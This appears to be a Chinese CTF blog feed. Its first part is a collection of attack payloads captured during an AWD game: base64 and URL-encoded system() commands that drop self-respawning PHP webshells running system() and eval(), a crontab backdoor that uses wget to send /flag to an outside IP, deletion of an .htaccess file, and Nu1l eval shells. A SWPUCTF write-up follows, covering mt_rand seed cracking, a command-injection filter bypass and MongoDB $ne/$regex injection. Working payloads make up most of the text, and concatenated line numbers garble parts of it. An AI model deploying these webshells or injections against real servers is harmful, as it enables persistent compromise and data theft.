JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);base64:$path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;PD9waHAKICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgICAgICAgICAkZmlsZSA9ICIuNGIyMjMzMWNlODZjOGNhYTBhZGMzNzAzOTMyNmQ1ZmMucGhwIjsKICAgICAgICAgICAgJHNoZWxsID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUthV1lvUUNSZlVrVlJWVVZUVkZzaWFHRnphQ0pkUFQwOUltWmxZV1F3Wm1aaE1EQmpNVGxpTm1JMlpUSTFaVFl3Wm1JelltTmxZalJpSWlrS2V3b2dJQ0FnUUhONWMzUmxiU2drWDFKRlVWVkZVMVJiSW0xdmVHbGhiM2hwTmpZMklsMHBPd3A5Q2o4KycpOwogICAgICAgICAgICB1bmxpbmsoX19GSUxFX18pOwogICAgICAgICAgICB3aGlsZSAoVFJVRSkge3sKICAgICAgICAgICAgaWYgKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSE9PSRzaGVsbCkge3sgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRzaGVsbCk7IH19CiAgICAgICAgICAgIHVzbGVlcCg1KTsKICAgICAgICAgICAgfX0KICAgICAgICAgICAgPz4=&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX);$code_template的base64解码&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;PD9waHAKaWYoQCRfUkVRVUVTVFsiaGFzaCJdPT09ImZlYWQwZmZhMDBjMTliNmI2ZTI1ZTYwZmIzYmNlYjRiIikKewogICAgQHN5c3RlbSgkX1JFUVVFU1RbIm1veGlhb3hpNjY2Il0pOwp9Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt; $shell 解base64：&lt;?phpif(@$_REQUEST[&quot;hash&quot;]===&quot;fead0ffa00c19b6b6e25e60fb3bceb4b&quot;)&#123; @system($_REQUEST[&quot;moxiaoxi666&quot;]);&#125;?&gt; 2： 1234567891011121314151617181920212223242526272829303132333435363738394041424344system%28%27%2Fbin%2Fecho+mo123%3B%2Fbin%2Fecho+JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw%3D%3D+%7C+%2Fusr%2Fbin%2Fbase64+-d+%7C+%2Fbin%2Fcat+%3E+%2Fhome%2Fteam%2Fworkdir%2F%2F.4b22331ce86c8caa0adc37039326d5fc.php%3B%2Fbin%2Fecho+xiaoxi456890%27%29%3B// url decodesystem(&apos;/bin/echo mo123;/bin/echo JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// base64 decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;PD9waHAKICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICAgICAgICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgICAgICAgICAkZmlsZSA9ICIuNGIyMjMzMWNlODZjOGNhYTBhZGMzNzAzOTMyNmQ1ZmMucGhwIjsKICAgICAgICAgICAgJHNoZWxsID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUthV1lvUUNSZlVrVlJWVVZUVkZzaWFHRnphQ0pkUFQwOUltWmxZV1F3Wm1aaE1EQmpNVGxpTm1JMlpUSTFaVFl3Wm1JelltTmxZalJpSWlrS2V3b2dJQ0FnUUhONWMzUmxiU2drWDFKRlVWVkZVMVJiSW0xdmVHbGhiM2hwTmpZMklsMHBPd3A5Q2o4KycpOwogICAgICAgICAgICB1bmxpbmsoX19GSUxFX18pOwogICAgICAgICAgICB3aGlsZSAoVFJVRSkge3sKICAgICAgICAgICAgaWYgKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSE9PSRzaGVsbCkge3sgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRzaGVsbCk7IH19CiAgICAgICAgICAgIHVzbGVlcCg1KTsKICAgICAgICAgICAgfX0KICAgICAgICAgICAgPz4=&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// base64 decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;PD9waHAKaWYoQCRfUkVRVUVTVFsiaGFzaCJdPT09ImZlYWQwZmZhMDBjMTliNmI2ZTI1ZTYwZmIzYmNlYjRiIikKewogICAgQHN5c3RlbSgkX1JFUVVFU1RbIm1veGlhb3hpNjY2Il0pOwp9Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt;&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;&lt;?phpif(@$_REQUEST[&quot;hash&quot;]===&quot;fead0ffa00c19b6b6e25e60fb3bceb4b&quot;)&#123; @system($_REQUEST[&quot;moxiaoxi666&quot;]);&#125;Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt;&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;); 3: 种crontab后门定时交flag 12345system(&apos;/bin/echo mo123;/bin/echo KiAqICogKiAqIC91c3IvYmluL3dnZXQgImh0dHA6Ly8xOTIuMTY4LjIwMC4xNTA6ODAwNS9hcGkvdGVhbS9zdWJtaXQvL2MxMzYyODI2MjI5M2M1ODVlYmZhZDM3Y2ExYzVlNzdkNDI4ZjVkY2QiIC1kICImZmxhZz0kKC9iaW4vY2F0IC9mbGFnKSIgLUggIkNvb2tpZTpkZGFhcyIK | /usr/bin/base64 -d | /bin/cat &gt;&gt; /tmp//tmp.conf ; /usr/bin/crontab /tmp//tmp.conf;/bin/echo xiaoxi456890&apos;);decode base64* * * * * /usr/bin/wget &quot;https://192.168.200.150:8005/api/team/submit//c13628262293c585ebfad37ca1c5e77d428f5dcd&quot; -d &quot;&amp;flag=$(/bin/cat /flag)&quot; -H &quot;Cookie:ddaas&quot; 4 1234567891011121314151617system%28%27%2Fbin%2Fecho+HENCE666%3B%2Fbin%2Fecho+PD9waHAKCQlpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkZmlsZSA9ICItLThmMDI5MzhlOWQyMWU2N2JmYzg3MjQwZjU4NGQ2NDQzLnBocCI7CgkJJHNoZWxsID0gJzw%2FcGhwIGlmKCRfUkVRVUVTVFtoYXNoXT09ImY5YjY5YTA5NjUxNGYyODIxMjg5MzVmZDA3N2YyZWJiIil7JGNfMSA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFthXSkpOyRjXzIgPSBiYXNlNjRfZGVjb2RlKHN0cl9yb3QxMygkX1JFUVVFU1RbYl0pKTskY18xKCRjXzIpO30%2FPic7CgkJdW5saW5rKF9fRklMRV9fKTsKCQl3aGlsZSAoVFJVRSkge3sKCQlpZiAoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIT09JHNoZWxsKSB7eyBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHNoZWxsKTsgfX0KCQl1c2xlZXAoNSk7CgkJfX0KCQk%2FPg%3D%3D+%7C+%2Fusr%2Fbin%2Fbase64+-d+%7C+%2Fbin%2Fcat+%3E+%2Fvar%2Fwww%2Fhtml%2F%2F--8f02938e9d21e67bfc87240f584d6443.php%3B%2Fbin%2Fecho+ZHANG777%27%29%3B// decodesystem(&apos;/bin/echo HENCE666;/bin/echo PD9waHAKCQlpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkZmlsZSA9ICItLThmMDI5MzhlOWQyMWU2N2JmYzg3MjQwZjU4NGQ2NDQzLnBocCI7CgkJJHNoZWxsID0gJzw/cGhwIGlmKCRfUkVRVUVTVFtoYXNoXT09ImY5YjY5YTA5NjUxNGYyODIxMjg5MzVmZDA3N2YyZWJiIil7JGNfMSA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFthXSkpOyRjXzIgPSBiYXNlNjRfZGVjb2RlKHN0cl9yb3QxMygkX1JFUVVFU1RbYl0pKTskY18xKCRjXzIpO30/Pic7CgkJdW5saW5rKF9fRklMRV9fKTsKCQl3aGlsZSAoVFJVRSkge3sKCQlpZiAoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIT09JHNoZWxsKSB7eyBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHNoZWxsKTsgfX0KCQl1c2xlZXAoNSk7CgkJfX0KCQk/Pg== | /usr/bin/base64 -d | /bin/cat &gt; /var/www/html//--8f02938e9d21e67bfc87240f584d6443.php;/bin/echo ZHANG777&apos;);// decode base64system(&apos;/bin/echo HENCE666;/bin/echo &lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;--8f02938e9d21e67bfc87240f584d6443.php&quot;; $shell = &apos;&lt;?php if($_REQUEST[hash]==&quot;f9b69a096514f282128935fd077f2ebb&quot;)&#123;$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);&#125;?&gt;&apos;; unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?Pg== | /usr/bin/base64 -d | /bin/cat &gt; /var/www/html//--8f02938e9d21e67bfc87240f584d6443.php;/bin/echo ZHANG777&apos;); 5 1234567891011121314151617%24path+%3D+%27%2Fhome%2Fteam%2Fworkdir%2Fskin%2F--ssssss.php%27%3B%24data+%3D+%27PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgJHBhdGggPSAiL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLnNzc3Nzcy5waHAiOwogICAgICAgICRkYXRhID0gIjw%2FcGhwIGlmKG1kNShcJF9QT1NUWydwYXNzJ10pPT0nYzI3MjFkODM2ZGRiNjg2YjBiMDFjYjAwNjYwODk5NTAnKUBldmFsKFwkX1BPU1RbJ2NtZCddKTs%2FPiI7CiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkZGF0YSk7CiAgICAgICAgc3lzdGVtKCdjaG1vZCA1MDAgJy4kcGF0aCk7CiAgICAgICAgdXNsZWVwKDEwMCk7CiAgICB9CiAgICA%2FPg%3D%3D%27%3B%24data%3D+base64_decode%28%24data%29%3B%40file_put_contents%28%24path%2C%24data%29%3Bsystem%28%27chmod+500+%27.%24path%29%3Bsystem%28%27%27rm+%29// deocde$path = &apos;/home/team/workdir/skin/--ssssss.php&apos;;$data = &apos;PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgJHBhdGggPSAiL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLnNzc3Nzcy5waHAiOwogICAgICAgICRkYXRhID0gIjw/cGhwIGlmKG1kNShcJF9QT1NUWydwYXNzJ10pPT0nYzI3MjFkODM2ZGRiNjg2YjBiMDFjYjAwNjYwODk5NTAnKUBldmFsKFwkX1BPU1RbJ2NtZCddKTs/PiI7CiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkZGF0YSk7CiAgICAgICAgc3lzdGVtKCdjaG1vZCA1MDAgJy4kcGF0aCk7CiAgICAgICAgdXNsZWVwKDEwMCk7CiAgICB9CiAgICA/Pg==&apos;;$data= base64_decode($data);@file_put_contents($path,$data);system(&apos;chmod 500 &apos;.$path);system(&apos;&apos;rm )// base64 decode$path = &apos;/home/team/workdir/skin/--ssssss.php&apos;;$data = &apos;&lt;?php ignore_user_abort(true); set_time_limit(0); while (1)&#123; $path = &quot;/home/team/workdir/skin/.ssssss.php&quot;; $data = &quot;&lt;?php if(md5(\$_POST[&apos;pass&apos;])==&apos;c2721d836ddb686b0b01cb0066089950&apos;)@eval(\$_POST[&apos;cmd&apos;]);?&gt;&quot;; @file_put_contents($path, $data); system(&apos;chmod 500 &apos;.$path); usleep(100); &#125; ?&gt;&apos;;$data= base64_decode($data);@file_put_contents($path,$data);system(&apos;chmod 500 &apos;.$path);system(&apos;&apos;rm ) 删、覆盖上传目录的.htaccess 1GET //libraries/lithium/template/view/Compiler.php?along=system(&apos;/bin/echo mo123;rm /home/team/workdir/app/webroot/uploads/.htaccess;/bin/echo xiaoxi456890&apos;); 还有个没看懂的ip：192.168.17.11 123456789101112131415%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Becho%20%22d32d8%22%3B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3Becho%20%221d77b%22%3Bdie()%3B//decode@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);echo &quot;d32d8&quot;;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125; &quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123; foreach(range(&quot;C&quot;,&quot;Z&quot;)as$L) if(is_dir(&quot;&#123;$L&#125;:&quot;) )$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot; &quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot; &#123;$s&#125;&quot;;echo $R;;echo &quot;1d77b&quot;;die(); Nu1l的shell1：192.168.21.x 123456789101112131415file_put_contents(&apos;Nu1ls.php&apos;,base64_decode(&quot;PD9waHAKCXNldF90aW1lX2xpbWl0KDApOwoJaWdub3JlX3VzZXJfYWJvcnQoMSk7Cgl1bmxpbmsoX19GSUxFX18pOwoJd2hpbGUoMSl7CgkJZmlsZV9wdXRfY29udGVudHMoJy4vLm51MWxjdGZzLnBocCcsICc8P3BocCBAZXZhbCgkX0dFVFsnbnVsbCddKTsnKTsKCQlzeXN0ZW0oJ2NobW9kIDc3NyAuY29uZmlnLnBocCcpOwkJCQkJCgkJLy/mjIHnu63lnKhjb25maWcucGhw5Lit5YaZ5YWlCgkJdG91Y2goIi4vLm51MWxjdGZzLnBocCIsIG1rdGltZSgyMCwxNSwxLDExLDE3LDIwMTcpKTsJCgkJdXNsZWVwKDEwMCk7Cgl9Cj8+Cg==&quot;))base64解码：&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1)&#123; file_put_contents(&apos;./.nu1lctfs.php&apos;, &apos;&lt;?php @eval($_GET[&apos;null&apos;]);&apos;); system(&apos;chmod 777 .config.php&apos;); touch(&quot;./.nu1lctfs.php&quot;, mktime(20,15,1,11,17,2017)); usleep(100); &#125;?&gt; Nu1l的shell2：123456file_put_contents%28%22Nu1ls.php%22%2Cbase64_decode%28%22PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs%2FPg%3D%3D%22%29%29%3B&amp;zzz=aaa//decodefile_put_contents(&quot;Nu1ls.php&quot;,base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs/Pg==&quot;));&amp;zzz=aaa//file_put_contents(&quot;Nu1ls.php&quot;,base64_decode(&quot;&lt;?php @eval($_POST[&apos;homaebic&apos;]);?&gt;&quot;));&amp;zzz=aaa final最后还有一些骚套路，等考完试写好awd框架了一起分享出来~]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SWPUCTF WEB Writeup]]></title>
    <url>%2F2018%2F12%2F20%2FSwpu%20CTF%202018%20Writeup%2F</url>
    <content type="text"><![CDATA[WEb 1:用优惠码 买个 X ?www.zip源码泄露：123456789101112131415161718192021222324252627&lt;?php//生成优惠码$_SESSION[&apos;seed&apos;]=rand(0,999999999);function youhuima()&#123; mt_srand($_SESSION[&apos;seed&apos;]); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; setcookie(&apos;Auth&apos;, $auth);&#125;//support if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123; if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125;?&gt; 登录后，题目给了我们15位的优惠码，而购买X的优惠码是24位的，再回过来看看代码，很明显考察php随机数安全问题。 这篇文章分析的不错：https://wonderkun.cc/index.html/?p=585 简单而言，生成优惠码的每一位字母(数)使用的随机数种子相同，即php在产生一系列随机数的时候只进行了一次播种。而在linux64位的系统中rand()和mt_rand()函数产生的最大随机数都是2^31-1，所以在这个范围内可以爆破。 最初想着直接用php爆破：1234567891011121314151617181920212223242526&lt;?phperror_reporting(E_ALL);//生成优惠码function youhuima($seed)&#123; mt_srand($seed); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; if($auth === &quot;9vmnye6GT7TpzH3&quot;)&#123; echo $seed; exit(); &#125;&#125;for($i=1; $i&lt;999999999; $i++)&#123; youhuima($i);&#125; 结果卡了很久很久 cpu爆炸.. 后来发现已经有大牛写了一个c语言爆破种子的程序：https://www.openwall.com/php_mt_seed/ 这里踩了很多坑… 4.0版本make编译报错，3.4的版本跑出来的种子死活都不对.. 后来仔细分析，这个和php版本相关：3.4的爆破脚本中描述： 然鹅我们题目是php7.2的版本 所以这里只能用4.0的爆破程序。 先将字母转换成对应的数字：123456789101112function getseed()&#123; $str = &quot;8zJag6b&quot;; $randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; for($i=0;$i&lt;strlen($str);$i++)&#123; $pos = strpos($randStr,$str[$i]); echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;; //整理成方便 php_mt_seed 测试的格式 //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]] &#125; echo &quot;\n&quot;;&#125; 然后爆破： 拿到种子后，记得在本地将php版本调到7.1+，生成24位的优惠码123456789101112131415function youhuima()&#123; mt_srand(&apos;727588335&apos;); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=24; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; echo $auth; echo &quot;\nsJO5ciqR&quot;; setcookie(&apos;Auth&apos;, $auth);&#125; 接着考察命令执行的漏洞：preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)m修饰符：换行匹配，所以构造payload：ip=| ls%0a127.0.0.1 这里可以用pcre_match贪婪匹配特性绕过？参考 第二层：用\或者””绕关键字即可ip=| c&quot;&quot;at /f&quot;&quot;lag%0a127.0.0.1 拿到flag:swpuctf{**08067_sec**$$%@!~~~~**} Web2:提示phpinfo:看到了mangodb，猜想这是nosql注入这里$ne在mongodb中表示：!=、&lt;&gt; /check.php?username[$ne]=%5C&amp;password[$ne]=%5C&amp;vertify=zxvz即表示用户名不为\且(or)密码不为\的用户。根据提示，可以猜想到密码就是flag 所以可以用$regex模糊查询 参考：https://www.freebuf.com/articles/database/95314.html 